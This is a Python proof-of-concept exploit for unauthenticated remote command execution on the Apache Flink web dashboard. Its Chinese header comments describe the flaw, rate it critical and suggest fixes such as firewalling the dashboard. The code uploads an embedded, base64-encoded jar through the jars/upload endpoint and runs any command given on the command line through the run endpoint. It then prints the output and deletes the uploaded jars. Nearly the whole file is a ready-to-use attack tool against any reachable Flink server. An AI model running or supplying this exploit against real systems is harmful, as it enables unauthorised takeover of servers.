#!/usr/bin/env python3
# _*_ coding: utf-8 _*_

__version__ = '1.1'
__author__ = 'bigger.wing'
__author_email__ = 'bigger.wing@gmail.com'
__referer__ = 'https://github.com/biggerwing' \
              'https://cloud.tencent.com/developer/article/1540439'
__changelog__ = '1. 2020.10.30 新建POC' \
                '2. 2020.11.1 修改部分私人信息' \

# 漏洞名称
__vuln_name__ = 'Apache Flink未授权访问上传导致的RCE漏洞'

# 漏洞风险等级critical/high/medium/low
__vuln_risk__ = 'critical'

# 漏洞详细信息
__vuln_detail__ = '1. Apache Flink 控制台默认情况下存在未授权访问' \
                  '2. 在Submit New Job处可添加上传jar包并在服务端执行' \
                  '3. 如果上传恶意的jar包，可拿下服务器的权限' \
                  '4. 该漏洞官方并未承认，官方只说这是其一个功能。但该功能会被坏人利用' \
# 漏洞修复方案
__vuln_repair__ = '网络上流传的影响版本只是在1.9.1以下的版本，是因为当时该漏洞刚出来的时候，最新版本为1.9.1，' \
                  '但现在的新版本已经远远超过了1.9.1，但目前官方并未出相关补丁或解决措施，实际测试中发现影响更多的版本' \
                  '1. 如果该服务是非必要服务，可以将其停用' \
                  '2. 如果无法停用受漏洞影响的业务，可尝试添加主机防火墙(iptables/firewalld)，只允许受信任的IP连接Dashboard' \
                  '3. 如果以上都做不到，可尝试修改其后端代码，禁止用户上传jar包(因需要环境，具体改法以后给出)'

# 影响范围：直接在平台搜索flink即可确认资产范围

import io
import re
import sys
import base64
import requests


class FlinkRCECheck:

    def __init__(self, url):
        self.url = url
        self.timeout = 10
        self.upload_file = 'rce_check_from_sec.jar'
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) '
                          'Chrome/61.0 Safari/537.36'
        }

    @property
    def get_version(self):
        url = '%s/%s' % (self.url, 'config')
        try:
            res = requests.get(url, headers=self.headers, timeout=self.timeout, verify=False)
            version = res.json().get('flink-version')
        except:
            version = 'unknown'
        return version

    @property
    def jar_check(self):
        url = '%s/%s' % (self.url, 'jars')
        jar_list = []
        try:
            res = requests.get(url, headers=self.headers, verify=False, timeout=self.timeout)
            if res.status_code == 200 and 'application/json' in res.headers.get('Content-Type', ''):
                res = res.json()
                for file in res['files']:
                    if file['id'].endswith(self.upload_file):
                        jar_list.append(file['id'])
        except Exception as e:
            pass

        return jar_list

    @property
    def jar_upload(self):
        url = '%s/%s' % (self.url, 'jars/upload')
        jar_content = base64.b64decode('UEsDBBQACAgIACJ1bU8AAAAAAAAAAAAAAAAUAAQATUVUQS1JTkYvTUFOSUZFU1QuTUb+ygAA803My'
                                       '0xLLS7RDUstKs7Mz7NSMNQz4OXyTczM03XOSSwutlJwrUhNLi1J5eXi5QIAUEsHCIiKCL8wAAAALg'
                                       'AAAFBLAwQKAAAIAAAidW1PAAAAAAAAAAAAAAAACQAAAE1FVEEtSU5GL1BLAwQUAAgICAAidW1PAAA'
                                       'AAAAAAAAAAAAADQAAAEV4ZWN1dGUuY2xhc3ONVet2E1UU/k4yyUwmQy+TQlsQBdSStqSxiIotIlAK'
                                       'VkJbSa0G8DKZHpPTJjNhLjTVCvoQ/ugT8MsfqCtx0aUPwEOx3Gdo09KGtUzW7H3O3vvbt7PPzPMXz'
                                       '/4FMIlfdbyDyxo+1XBFx1Vc05HCjIbrks+quKHipobPNMzp0PC5hlsqChpu6+jBvCQLGhal6gsVd3'
                                       'QUsaRjAF9qWJb8K0m+lqQkyd0URbin4r6OkzLoN5J/K8l3Or6HpaKswmZIXhKOCC4zxLOjywzKjLv'
                                       'CGXoLwuHzYb3MvSWrXCOJWXBtq7ZseULud4RKUBU+Q6ow2+R2GPBpEtUt4TAcy94rrFoPrXzNcir5'
                                       'YuAJpzItA7AGw/F9qkXPtbnvXwtFbYV75CDeCDZkuENo8m15FQqX6eKaHLuEtesrtJI2h0NIG7ujC'
                                       'QNRyxdty3GiqPps0+aNQLiOr4J86EU39Gx+Q8gyjZ3yJiTSwLsYYQCD6voTjlXnKriBH1AxUIWgJN'
                                       'aFY2AVawxDr6uToe9gCeSPsp/gTQoYy9syTI5k+bJw8n6VkogAws2/zCkVKcqWX5WWNQN1UNtjOQK'
                                       '6oB73H6pSxQMDHnxpH5Dp/asGQjw0sA7KtwlhYAMjBn7ETwyDB9PrJB7fvLJpYBM/G3gEoeKxgV9Q'
                                       'o0x3mvRKaQvlVW5TsMyeqNPoV3uw4Qe8zpCu8IBa1eCenIKRbJch6nb46cAtuOvcm7F8SmAg29VIs'
                                       '10noOmk8Tix3/FM1fKK/EHIHZtPj95lONotLM1ukjeFH/jRXSGzhB9YXiDNR7tOW/8hIUMP1TfnNM'
                                       'KA3HKLCh7cBdPJ7lMQfCjbVSETMUKfX+c1UReBPJKzr2/TgTFXq5Y/z5uUtOJELGHXXNmyuBvKSjo'
                                       'RF8nJXipJq9HgDl2L3P86kL3LrAXu7nRnurim+A25w2m8Te9G+YvRxaILRvQs7fLE6a4hMdYGexqp'
                                       's0STkZBhlKjx0gBjGCeewjnkyIrAbInskiT7y4wVxuLnb5vxv6G0kDCTLahbOLUNrZT8B6lS3NSLJ'
                                       'cVMF0uJc8U2jPknuGAemVK20VMye9voa6F/C6rZK0W7mGFFYswOJtdCRuoHSsMU5Ggbx8zBFoamEs'
                                       'OJFoa3kJb8+BMo4wW5OvEH3tjGyVIbb5pvtXBqnJ5o0cLpFs7s1fohjhCN01+BSvUMEr1AdV6Ejpt'
                                       'I4xbpOXqxhj66kP34DSb+RCbqzR36WEwScoIaGSdEDu/RXpE9wXm8H/l9St4m5dsMv+MDWsXI28IO'
                                       'Yg1zFP8jQjwifhEfU5+nCKWQ/TQ9l6IsP/kPUEsHCEEOnKXWAwAA4gYAAFBLAQIUABQACAgIACJ1b'
                                       'U+Iigi/MAAAAC4AAAAUAAQAAAAAAAAAAAAAAAAAAABNRVRBLUlORi9NQU5JRkVTVC5NRv7KAABQSw'
                                       'ECCgAKAAAIAAAidW1PAAAAAAAAAAAAAAAACQAAAAAAAAAAAAAAAAB2AAAATUVUQS1JTkYvUEsBAhQ'
                                       'AFAAICAgAInVtT0EOnKXWAwAA4gYAAA0AAAAAAAAAAAAAAAAAnQAAAEV4ZWN1dGUuY2xhc3NQSwUG'
                                       'AAAAAAMAAwC4AAAArgQAAAAA')
        files = {'jarfile': (self.upload_file, io.BytesIO(jar_content), 'application/octet-stream')}

        try:
            res = requests.post(url, headers=self.headers, files=files, timeout=self.timeout, verify=False)
            file_id = res.json()['filename'].split('/')[-1]
            return file_id
        except Exception as e:
            res = False
        return res

    @property
    # 删除所有历史遗留的jar包
    def jar_delete(self):
        for jar_name in self.jar_check:
            url = '%s//jars/%s' % (self.url, jar_name)
            try:
                requests.delete(url=url, headers=self.headers, timeout=self.timeout, verify=False)
            except:
                pass
        return

    def rce(self, command):
        jar_file = self.jar_upload
        try:
            execute_cmd_url = '%s/jars/%s/run?entry-class=Execute&program-args="%s"' % (self.url, jar_file, command)
            res = requests.post(url=execute_cmd_url, headers=self.headers, timeout=self.timeout, verify=False)
            res = re.findall('\|@\|(.*?)\|@\|', res.text)[0][0:-2]
            if res:
                print('rce command "%s" exec result: %s' % (command, res))
                state = 1
                msg = '%s rce success' % self.url
            else:
                state = 0
                msg = '%s rce failed' % self.url
        except:
            state = 0
            msg = '%s rce failed' % self.url

        delete = self.jar_delete

        return {'state': state, 'version': self.get_version, 'msg': msg}


if __name__ == '__main__':
    usage = 'python3 script.py ip port command'
    if len(sys.argv) != 4:
        print('simple usage: %s' % usage)
    else:
        ip = sys.argv[1]
        port = sys.argv[2]
        command = sys.argv[3]
        url = 'http://%s:%s' % (ip, port)
        res = FlinkRCECheck(url=url).rce(command=command)
        print(res)
